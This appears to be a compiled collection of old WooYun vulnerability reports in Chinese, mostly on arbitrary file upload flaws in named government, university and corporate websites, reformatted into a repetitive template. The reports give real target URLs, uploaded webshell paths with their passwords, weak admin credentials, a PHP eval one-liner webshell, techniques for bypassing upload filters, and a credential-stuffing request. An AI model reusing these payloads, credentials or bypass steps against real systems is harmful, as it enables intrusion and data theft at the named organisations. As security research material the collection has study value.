**绕过**: 直接利用

**修复**: 这个你们比我专业
---

---
### [wooyun-2014-072438] 华云数据任意文件上传漏洞可控制服务器
**厂商**: 华云数据技术服务有限公司 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞页面 http://www.chinac.com/Account/agentapply.html在这里有个上传头像的地方我们打开burpsuite，配置好 然后将菜刀的代码用记事本保存为图片然后选择点击上传，然后被burpsuite拦截到我们把后缀改成php上传成功，右键处头像复制地址菜刀连之

**POC**: 整站源码 数据库啥的

**绕过**: 直接利用

**修复**: 我读书少 以后可以在你们那找个工作啥的吗？
---

---
### [wooyun-2013-025499] 国家电网湖南某校教务管理系统存在上传漏洞（已被入侵）
**厂商**: 国家电网公司 | **年份**: 2013 | **类型**: 后台弱口令

**元思考**: 触发信号: 上传功能

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 国家电网湖南长沙电力职业技术学校教务管理系统存在上传漏洞，而且已经发现被国内某黑客组织成功入侵了

**POC**: 上传漏洞地址 http://220.168.57.6/(x3kb1a45qpfrzl2ywhr5ic2y)/ftb.imagegallery.aspx我来晚了一步....已经被成功入侵了

**绕过**: 直接利用

**修复**: 这个你们相信比我专业
---

---
### [wooyun-2013-046302] 北京日报社某分站任意上传导致服务器沦陷
**厂商**: 北京日报报业集团 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 北京日报社在线招聘http://hr.bjd.com.cn提交简历 上传资料处，只对前端做了限制，服务器端无限制，可上传任意文件MSSQL SA弱口令，可获得系统权限.

**POC**: http://hr.bjd.com.cn/https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/memberother/20131218/ef0c703b91644dbda9e78f9eac5c3492.aspxWindows IP 配置主机名 . . . . . . . . . . . . . : ERP主 DNS 后缀 . . . . . . . . . . . :节点类型 . . . . . . . . . . . . : 混合IP 路由已启用 . . . . . . . . . . : 否WINS 代理已启用 . . . . . .

**绕过**: 直接利用

**修复**: 服务端做限制 禁止上传文件目录执行权限 改SA
---

---
### [wooyun-2014-061532] 某评估师协会官网后台任意上传影响服务器安全（危及行业及执业人员执业信息）
**厂商**: 某评估师协会 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 从这里直接无需登录在后台利用解析漏洞传一句话图片马http://www.camra2006.org.cn/admin/News/InfoEdit.aspx?iProject=5&iInfoID=396进入数据库，众多执业评估师个人信息及评估事项详细信息服务器上还有许多内部文件和数据库、网站源码的备份，另外还有一套考试系统，矿业权评估师执业资格是两年才考一次，而且报考门槛不低，含金量应该不差。另外发现了一个13年4月6号上传到服务器上的疑似木马，也请注意做一下全面的清理。

**POC**: 如上

**绕过**: 直接利用

**修复**: 全面检查
---

---
### [wooyun-2015-0112862] 上海高层次人才网存在任意文件上传及文件遍历漏洞
**厂商**: 上海市委组织部 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上海高层次人才网地址：http://shrcw.gov.cn/index.html问题原因，站点使用的fck编辑器配置不当fck目录遍历：http://shrcw.gov.cn/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../

**POC**: 文件上传：http://shrcw.gov.cn/cms/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://shrcw.gov.cn/editor/filemanager/browser/default/connectors/jsp/connectorshell地址：http://shrcw.gov.cn//UserFiles/Image/x.jsp密码：520o520

**绕过**: 直接利用

**修复**: 过滤，正确配置fck编辑器
---

---
### [wooyun-2015-0149241] 某工商局企业联络平台任意文件上传
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1，直接访问后台上传文件：http://**.**.**.**/sipicabgov/web/CheckBooking/AddBookingStep1.aspx2，上传任意文件：3，菜刀连接：4，数据库、邮箱密码泄露：

**POC**: 1，直接访问后台上传文件：http://**.**.**.**/sipicabgov/web/CheckBooking/AddBookingStep1.aspx2，上传任意文件：3，菜刀连接：4，数据库、邮箱密码泄露：

**绕过**: 直接利用

**修复**: 1，后台添加权限判断。2，文件上传格式过滤。
---

---
### [wooyun-2010-0762] 游戏人才网上传漏洞
**厂商**: 游戏人才网 | **年份**: 2010 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 未过滤后缀.php的文件名。只验证了文件头gif89a

**POC**: 加入Gif89a的任意文件即可上传。。。http://www.jobg.cn  注册用户 上传。。。。

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0139926] 川师某站文件上传漏洞
**厂商**: sicnu.edu.cn | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登陆之后，有个二手市场，里边可以发布相关信息：http://hq.sicnu.edu.cn/home/Markbrow?ID=799然后在“回复信息”这看到有上传的地方，高兴坏了直接绕过其实在“发布信息”一栏中也有 上传点，但是那个没有绕过去另外不小心扫到了这个：http://hq.sicnu.edu.cn/log.txt不用登陆就可以访问

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 你懂得的呦
---

---
### [wooyun-2012-014622] 央视网任意文件上传.....亲，求礼物
**厂商**: 中国网络电视台 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册一个用户，在发表日志处怎么看都像是fckedit图片上传只检测了文件内容没检测后缀....合一个图片马就ok啦

**POC**: 嘿嘿....这就搞定了吧.........求礼物求礼物求礼物....

**绕过**: 直接利用

**修复**: ....................................亲........淫家求礼物....................................亲
---

---
### [wooyun-2012-07043] 邮易购分站任意文件上传
**厂商**: 邮易购 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 客服系统用友ICC任意文件上传http://icc.posgoo.com/phpinfo泄漏http://icc.posgoo.com/info.php详见WooYun: 用友ICC网站客服系统远程代码执行漏洞

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改程序
---

---
### [wooyun-2015-0150269] 哈工大某分站任意上传（已获system）
**厂商**: 哈尔滨工业大学 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://wlds.hit.edu.cn/WindLab/zxgj.jsp?id=6

**POC**: http://wlds.hit.edu.cn/WindLabhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/1446039622042.jsp shell地址

**绕过**: 直接利用

**修复**: 限制上传文件格式
---

---
### [wooyun-2015-0106963] 美图秀秀活动页面任意文件上传
**厂商**: 美图秀秀 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞页面:http://xiuxiu.huodong.meitu.com/0408/#rd后台上传程序未对后缀做判断.POST / HTTP/1.1Host: up.qiniu.comUser-Agent: Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateRefere

**POC**: 直接打开就是证明:http://mtapplet.meitudata.com/.

**绕过**: 直接利用

**修复**: 你懂得.
---

---
### [wooyun-2015-0120490] 苏宁易购漏洞大礼包（某内部系统5W+弱口令、任意文件上传、1566台服务器密码泄漏）
**厂商**: 江苏苏宁易购电子商务有限公司 | **年份**: 2015 | **类型**: 内部绝密信息泄漏

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 内部绝密信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别内部绝密信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这次主要以内部系统和通讯平台为主。先说一下内部平台问题1.http://ydxuexi.cnsuning.com/clp/redirectLogin.htm内部云店学习平台无验证码，后端也没有放爆破机制看了下源文件if (self != top) {top.location = self.location;};$().ready( function() {var $errorMsgTip=$("#errorMsgTip");$("#login-btn").click(function(){var $username = $("#j_username");var $password = $("#j_password");if ($username.val() == "请输入SOA工号" || $username.val() == "") {$errorMsgTip.html("请输入SOA工

**POC**: 最重要的是员工号命名规则被猜解出，仅仅撞了一个固定弱口令就撞出来5W+弱口令相关接口POST /IMuserAPI/v1/login/getimurl.do HTTP/1.1Host: imapp.suning.comUM_SYSTEM=UWPPORTAL&UUM_COMPANYCODE=oa.cnsuning.com&username=§10****01§&password=§****§根据用户名命名规则生产了一个72W的用户名字典，测试成功如下这些弱口令配合上一个漏洞里提到的内部豆芽系统，登录了几个账号看了一下。豆芽是苏宁自己开发的类似QQ和微信的软件。里面有企业所有的组织架构，员工联系方

**绕过**: 直接利用

**修复**: 我觉得问题的根源身份认证方式1.内部系统对外接口没有限制，可猜测大量的账号密码。建议内部系统统一一个认证接口登陆，加强认证防止撞库。可加入手机短信认证等2.系统间身份认证又是通用的，才导致进一步的严重信息泄漏。不同系统最好使用不同的密码，通用密码害死人啊。。3.密码使用规则没有统一标准要求。豆芽系统
---

---
### [wooyun-2015-0112312] 中国通信服务福建公司某系统SQL注射+任意文件上传
**厂商**: 中国通信服务福建公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标系统：http://www.fjccs.com.cn:8801/fjccsadmin/系统登录框存在注入POST http://www.fjccs.com.cn:8801/fjccsadmin/login.aspx HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://www.fjccs.com.cn:8801/fjccsadmin/login.aspxAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, defl

**POC**: 通过注入可得到系统登录帐号该系统大部分帐号都是弱口令000000以其中一个帐号登录，在设置，个人签名处可上传shell一句话地址：http://www.fjccs.com.cn:8801/fjccsadmin/upfiles/seal/A0000494wooyun.aspx密码：abcd

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0150857] 厦门易尔通网络某平台代理数据库涉及大量网站数据
**厂商**: 厦门易尔通网络科技有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 泄漏数据库地址http://chaoshi.12t.cnhttp://chaoshi.12t.cn/include/upload.php  修改上传源码

**POC**: 莫非传说中的两千万开房数据就是这样来的?

**绕过**: 直接利用

**修复**: 我们就这样敲了敲键盘 轻轻的来  什么也没有留下就轻轻的走....
---

---
### [wooyun-2013-028826] 海马汽车官网任意上传文件漏洞
**厂商**: 海马汽车 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 海马汽车官网存在 上传任意文件等漏洞、可能导致整个服务器沦陷。

**POC**: 主站遍历目录主站有ew编辑器分站ew编辑器主站上传漏洞小马菜刀写个txt提示下 嘎嘎。

**绕过**: 直接利用

**修复**: 删除上传文件
---

---
### [wooyun-2014-055625] 贪吃网SQL注射漏洞导致可登录网站后台
**厂商**: 贪吃网 | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 贪吃网可登录网站后台，多种操作，文件上传未尝试，但是可见管理员分权限，目测通过超级管理员登录，可以修改允许上传的文件类型，完成网马上传。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: root.txt是关键，sql注入要修改
---

---
### [wooyun-2015-0146750] 网站安全狗文件上传绕过2(Windows+apache)
**厂商**: 安全狗 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 上传功能

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 利用扩展的ascii码来绕过。测试发现在文件后缀增加扩展的ascii码可绕过上传防护，比如0x7f、0x88、0xb0、0xc0、0xaa、0xe0、0xee等等。网站安全狗（APACHE版）for Windows测试主程序版本：3.5.11730测试网马库版本：2015-10-08测试环境：vmware Windows xp sp3，apache+php+mysql集成环境测试过程：直接上传php文件，会被拦截：此时在22.php后增加一个扩展的ascii码，比如0xcc，发现上传成功：

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 在文件名处理中，对上述提到的特殊字符进行适当处理。
---

---
### [wooyun-2014-087609] THEOL网络教学综合平台通用型任意文件上传
**厂商**: 清华大学教育技术研究所 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 系统全名"THEOL清华教育在线"网络教学综合平台，由清华大学教育技术研究所提供技术支持，其部署在全国大部分高校，用作选课、评分、在线考试等关键字：inurl:eol/homepage/common/或：欢迎进入网络教学综合平台1#以任意身份帐号登录该系统帐号例：teachertheol_teacherteacher_ptheol_student以及百度到的学号密码：123456000000以及百度到的学号2#在课程描述的教学录像处存在任意上传页面：http://*/eol/popups/jpkrecord/upload_file.jsp?courseId=*其代码中有对用户的权限进行判断，如果登录的是普通权限帐号则返回错误,如果登录admin帐号则判断其它if (!um.checkPermission(User.USER_PERM_JPKADMIN_BASIC)&&(column.get

**POC**: 以东华理工大学为例：（theol_student/123456）http://eol.ecit.cn/eol/homepage/common/opencourse/访问地址：http://eol.ecit.cn/eol/data/jpk/0/1.jspPOST http://eol.ecit.cn/eol/popups/jpkrecord/receive.jsp HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://eol.ecit.cn/eol/popups/jpkrecord/upload_file.jsp

**绕过**: 直接利用

**修复**: 上传点做好过滤吧，弱口令就爱莫能助了，密码最好不要明文存在EOL_USER表里说一说危害吧，很多大学已经开始用单点登录了，如果裤子被脱了，相信大部分老湿和童鞋的密码都会暴露出来，话说天朝滴老湿，你们的工资好高哟~~~
---

---
### [wooyun-2015-0110330] 看我如何一步步拿下北大方正的一项业务以及30w用户的
**厂商**: 北京北大方正电子有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 基友介绍了一款安卓手机上的写字app——写字先生，官网http://xiezi.foundertype.com/让我拾起了写字的热情 这么文艺的app当然要检测一番于是。。。随手意见反馈那里插了下。第二天，插入cookie 成功进入后台~五十万的装机量，看来用的人还不少呢。 继续 找上传，欸，还真找到一个。。。不过真的想吐槽一下。。。任意文件上传。。。这样真的好吗。。。一句话伺候。不过接下来卡了10分钟。。。上传上去了，返回文件名了，不过路径去哪找。。。我深呼一口气，推了推眼镜，从容的打开手机app ，burp，手机点击相应的模块， 路径跃然眼前。~于是 拼接我一句话地址如下：http://xiezi.foundertype.com/MrWrite2SIM/xml/20150420192358.asp 密码c上菜刀~写字先生文件源码备份，另外还包括一款好像正在测试的软件~webfont找到

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-034836] newetone主站和管理系统存高危安全漏洞导致泄露大量订单与银行卡敏感信息(密码明文存储)
**厂商**: newetone | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: AD：NewEtone国际长途电话卡可以从全球各地拨打电话，并且话费低廉、语音质量好。主站和管理系统均存在struts漏洞，配置文件泄露多个数据库配置等大量敏感信息。用户信息和电话卡信息还有各种交易信息等等诸多信息大量侧漏。用户密码明文存储。

**POC**: 主站地址：http://www.newetone.com/后台地址：http://www.newetone.com:8080/均存在struts漏洞网站首页截图主站有过滤，shell直接废了管理后台未过滤，马儿活着，配置文件截图，大量敏感信息侧漏一个账号导致多个数据库侧漏用户密码直接明文大量订单信息侧漏然后某些卡的信息验证下，成功只进了一个库瞅了几眼，其他的库没进去看，目测数据量不小。裤子什么的没动，厂商尽快修复吧，不然，各种vip。。。。。呵呵。。。。最后弱弱的问一句：咱能不用明文么？？？要不要给发个VIP啥的

**绕过**: 直接利用

**修复**: 弃用struts
---

---
### [wooyun-2012-07698] PPTV的又一个FCK 漏洞
**厂商**: PPTV(PPlive) | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://alliance.pptv.com/include/fckeditor/editor/filemanager/connectors/test.htmlhttp://alliance.pptv.com/include/fckeditor/editor/filemanager/connectors/uploadtest.html没有删除http://alliance.pptv.com/publichttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/tup.jpg/x.php老早的nginx的解析漏洞....我真的不是故意的...仅仅是作为一次测试，没有入侵来着..

**POC**: http://alliance.pptv.com/include/fckeditor/editor/filemanager/connectors/test.htmlhttp://alliance.pptv.com/include/fckeditor/editor/filemanager/connectors/uploadtest.html没有删除http://alliance.pptv.com/publichttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/tup.jpg/x.php老早的nginx的解析漏洞....写了老半天，突然发现W

**绕过**: 直接利用

**修复**: 你们懂得...
---

---
### [wooyun-2014-080481] 某协同OA、协同CRM存在文件上传漏洞
**厂商**: 成都任我行信息技术有限公司 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 官网：http://www.wecrm.com/成都任我行信息技术有限公司存在问题的系统是：任我行协同CRM、任我行协同OA、任我行协同CRM 精华版客户案例：http://www.wecrm.com/static/consumer/

**POC**: 漏洞文件：Handlers/OfficeFileDataWrite.ashxif (context.Request["fileName"] != null){text = context.Request["fileName"].ToString();  //可控，文件名}……………………try{HttpPostedFile httpPostedFile2 = context.Request.Files["EDITFILE"];if (httpPostedFile2 != null){int contentLength2 = httpPostedFile2.ContentLength;byte[

**绕过**: 直接利用

**修复**: 随机化某个参数即可
---

---
### [wooyun-2015-0104337] 某政府建站系统通用型漏洞打包
**厂商**: 宁夏电通物联网技术有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先这个厂商有前人提过的一个漏洞，WooYun: 某通用型政府建站系统由一个越权页面+恶意修改导致网站瞬间出错，文中提到存在越权的页面为http://www.cn-dt.com.cn/cms/template/templateList.jsp其实不止是该页面，通过系统的目录浏览，我们能发现更多的问题以官网为例2#目录浏览（非所有案例都存在，大部分）http://www.cn-dt.com.cn//common/http://www.cn-dt.com.cn/cms/http://www.cn-dt.com.cn/extfile/http://www.cn-dt.com.cn/conf/http://www.cn-dt.com.cn/stat/3#大量管理页面未授权访问也就是说只要你猜得到目录名，目录底下的所有文件你都可以尝试是否存在越权访问我举几个明显的例子（非所有案例都存在，大部分）ht

**POC**: http://dfz.yinchuan.gov.cn:80/extfile/20150328/2015032812163733.jsphttp://gxj.yinchuan.gov.cn:80/extfile/20150328/2015032812105733.jsphttp://www.nxzb.com.cn:80/extfile/20150327/2015032710501333.jsphttp://www.nxgczl.com.cn/common/sweditor/uploadfile/2015032710452933.jsphttp://www.nxnc.gov.cn:80/commo

**绕过**: 直接利用

**修复**: 删除不正确的SVN、CVS配置控制权限上传点过滤
---

---
### [wooyun-2013-022440] 织梦后台之京华网分站后台频道编辑权限上传绕过
**厂商**: jinghua.cn | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在京华网的一个注入点上面获得了分站的一些账号密码频道编辑权限,想了很久什么都没法利用，看到了上传新文件.由于上传木马成功后不到3分钟管理员就删除了我的马,设置了不让上传了,我这里用本地搭建的环境测试上传添加新文件选择附件,把马的名字改为1.php.rar.php然后点击上传,会自动更名为php文件

**POC**: 下面附上京华网上传成功的图这是本地测试的图:给个邀请码吧,亲.

**绕过**: 直接利用

**修复**: ..............
---

---
### [wooyun-2014-065212] 某在线生成app平台任意上传漏洞
**厂商**: iappk.com | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某在线生成app 平台 任意上传

**POC**: 生成app后 在后台管理自己的app -> 关于我们 这个模块下 允许用户上传logo   没有经过任何验证。。导致恶意代码任意执行。。泄露全部用户信息。。上菜刀用户 全部信息  幸好密码加密了。哈哈没有脱裤。

**绕过**: 直接利用

**修复**: 管理员比我懂。。。Just you know...
---

---
### [wooyun-2015-0115248] 苏州市疾病预防控制中心某处文件上传漏洞
**厂商**: 苏州市疾病预防控制中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过扫描发现上传页面：http://www.szcdc.cn/admin/fckeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test.html通过测试对上传文件没有任何限制。

**POC**: 访问：http://www.szcdc.cn/admin/fckeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test.html直接上传webshell

**绕过**: 直接利用

**修复**: 删除不必要的上传功能，或对上传文件类型进行校验！
---

---
### [wooyun-2016-0195499] 驾考宝典WebView组件任意代码执行漏洞
**厂商**: 驾考宝典 | **年份**: 2016 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 驾考宝典支持的最小SDK版本小于Android API 17，同时在有奖试驾页面使用了WebView组件，导致该组件存在WebView任意代码执行漏洞，攻击者可以篡改该页面从而利用该漏洞，使用户在打开软件页面时执行任意由攻击者构造的代码。使用apktool反编译后，漏洞所在的文件位置为：Lcom/handsgo/jiakao/android/controller/MainController.smali漏洞所在函数为：a()V具体代码位置如下图所示：

**POC**: 1.软件正常打开2.搭建Kali dns欺骗环境3.虚拟机所在PC连入Kali所在热点4.进行dns缓存刷新后打开驾考宝典有奖试驾页面加载时dns被欺骗，连入Kali服务器，加载恶意的html文件的任意JavaScript代码。图示显示了被篡改的页面通过java反射机制调用Android API获取IMEI、IMSI等信息用户信息泄露。

**绕过**: 直接利用

**修复**: 1. API Level等于或高于17的Android系统【4】出于安全考虑，为了防止Java层的函数被随便调用，Google在4.2版本之后，规定允许被调用的函数必须以@JavascriptInterface进行注解，所以如果某应用依赖的API Level为17或者以上，就不会受该问题的影响（注：
---

---
### [wooyun-2014-074498] 中国移动某省网管系统后台弱口令（安全意识薄弱）
**厂商**: https://211.137.251.50:8443/ | **年份**: 2014 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://211.137.251.50:8443/config/app用户名/密码 admin/admin

**POC**: 上图

**绕过**: 直接利用

**修复**: 我给你们定等保三级，（安全运维管理）需加强
---

---
### [wooyun-2013-023919] BugFree任意文件上传漏洞
**厂商**: BugFree | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 每天都改Bug烦死了，没事看下了BugFree，新版本和官方演示站都存在文件上传漏洞

**POC**: 选择任意一个Bug 编辑>>附件处就可以上传任意文件了，由于BugFree文件下载并不是直接链到文件的真实地址，而是用程序去读取源地址下载所以找到文件的真实名称也是一个体力活。但是如果有列目录之类的漏洞的话，拿shell会非常轻松。暂时算比较鸡肋，等bug改完了再去读一下程序。

**绕过**: 直接利用

**修复**: 类型限制，老版本有验证，新版本的验证去哪里了？
---

---
### [wooyun-2015-0105070] 某数字化校园平台通用任意文件上传#2
**厂商**: Cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: inurl:EduPlate\GoodoBlog\

**POC**: http://chxx.edu.sh.cn/EduPlate/GoodoBlog/ftb.insertFile.aspxhttp://syxx.mhedu.sh.cn/EduPlate/GoodoBlog/ftb.insertFile.aspxhttp://www.mhhqyy.com/EduPlate/GoodoBlog/ftb.insertFile.aspxhttp://www.pslq.pudong-edu.sh.cn/goodo/EduPlate/GoodoBlog/ftb.insertFile.aspxhttp://www.hsyr.pudong-edu.sh.cn/EduPlate

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-020857] ECSHOP网站程序可以绕过权限上传一句话木马
**厂商**: ShopEx | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 前台留个言，内容是我们的一句话木马：<?php eval($_POST[cmd]);?>接着在后台系统==>数据库管理==>数据备份==>选择自定义备份，选择ecs_feedback这张表（存放留言的表）备份文件名：xxx.php;.sql 这种格式来备份提示成功了。

**POC**: 一句话连接成功

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0110857] 珠海市某网上申报系统存在任意文件上传及文件遍历漏洞
**厂商**: 珠海市科技工贸和信息化局 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

